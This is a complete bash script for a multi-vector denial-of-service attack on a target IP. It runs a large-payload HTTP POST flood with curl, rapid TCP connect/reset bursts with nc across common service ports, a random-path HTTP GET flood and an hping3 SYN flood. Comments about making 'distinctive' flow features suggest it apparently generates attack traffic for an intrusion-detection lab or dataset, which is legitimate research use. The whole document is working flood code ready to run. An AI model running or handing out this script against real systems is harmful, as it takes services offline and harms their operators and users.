#!/bin/bash
# DDoS Attack — Multi-vector volumetric attack
# Generates DISTINCTIVE complete TCP flows:
#   Phase 1: HTTP POST flood with LARGE payloads (50KB+) → high dataByteCount
#   Phase 2: TCP rapid connect/reset → very short duration, RST flags
#   Phase 3: HTTP GET flood with abnormal patterns → high request rate, varied paths
#   Phase 4: SYN flood backup (hping3) → even if not captured, adds volume
#
# Environment: TARGET_IP, DURATION (seconds)
set -e

TARGET="${TARGET_IP:?TARGET_IP not set}"
DUR="${DURATION:-60}"

echo "[DDoS] Starting multi-vector volumetric attack on $TARGET for ${DUR}s"

# Pre-generate large payloads for distinctive dataByteCount
dd if=/dev/urandom bs=50000 count=1 2>/dev/null | base64 > /tmp/payload_50k.txt
dd if=/dev/urandom bs=10000 count=1 2>/dev/null | base64 > /tmp/payload_10k.txt

# Phase 1: HTTP POST flood with LARGE payloads (40% of time)
# Creates flows with very high octetTotalCount/dataByteCount (distinctive!)
P1_DUR=$((DUR * 40 / 100))
echo "[DDoS] Phase 1: Large-payload HTTP POST flood for ${P1_DUR}s"
P1_END=$(($(date +%s) + P1_DUR))

while [ "$(date +%s)" -lt "$P1_END" ]; do
    for i in $(seq 1 30); do
        # 50KB POST — massively larger than any normal HTTP traffic
        curl -s -o /dev/null -m 3 -X POST \
            -H "Content-Type: application/octet-stream" \
            -d @/tmp/payload_50k.txt \
            "http://${TARGET}:8080/" 2>/dev/null &
        # 10KB POST to port 80
        curl -s -o /dev/null -m 3 -X POST \
            -d @/tmp/payload_10k.txt \
            "http://${TARGET}/" 2>/dev/null &
    done
    wait
    sleep 0.05
done

# Phase 2: TCP rapid connect/disconnect (30% of time)
# Creates very short-duration flows with RST flags → distinctive duration + flags
P2_DUR=$((DUR * 30 / 100))
echo "[DDoS] Phase 2: TCP rapid connect/reset for ${P2_DUR}s"
P2_END=$(($(date +%s) + P2_DUR))

while [ "$(date +%s)" -lt "$P2_END" ]; do
    for port in 80 8080 443 21 25 110 143 3306 5432 8443; do
        # Connect and immediately close → creates short-duration RST flows
        (echo -ne "GET / HTTP/1.0\r\n\r\n" | nc -w 1 "$TARGET" "$port" 2>/dev/null || true) &
    done
    # Also rapid connections with random data
    for i in $(seq 1 20); do
        (echo "ATTACK$(head -c 200 /dev/urandom | base64)" | nc -w 1 "$TARGET" 80 2>/dev/null || true) &
    done
    wait
    sleep 0.02
done

# Phase 3: HTTP GET flood with varied paths (20% of time)
# High connection rate + varied URLs → distinctive pattern
P3_DUR=$((DUR * 20 / 100))
echo "[DDoS] Phase 3: HTTP GET flood for ${P3_DUR}s"
P3_END=$(($(date +%s) + P3_DUR))

while [ "$(date +%s)" -lt "$P3_END" ]; do
    for i in $(seq 1 50); do
        curl -s -o /dev/null -m 2 "http://${TARGET}:8080/$(head -c 16 /dev/urandom | od -A n -t x1 | tr -d ' ')" 2>/dev/null &
        curl -s -o /dev/null -m 2 "http://${TARGET}/$(head -c 8 /dev/urandom | od -A n -t x1 | tr -d ' ')" 2>/dev/null &
    done
    wait
    sleep 0.02
done

# Phase 4: SYN flood backup (even if not captured as flows, adds noise)
P4_DUR=$((DUR * 10 / 100))
echo "[DDoS] Phase 4: SYN flood backup for ${P4_DUR}s"
timeout "${P4_DUR}" hping3 -S -p 80 --flood "$TARGET" 2>/dev/null &
timeout "${P4_DUR}" hping3 -S -p 8080 --flood "$TARGET" 2>/dev/null &
sleep "$P4_DUR" || true

echo "[DDoS] Attack complete"
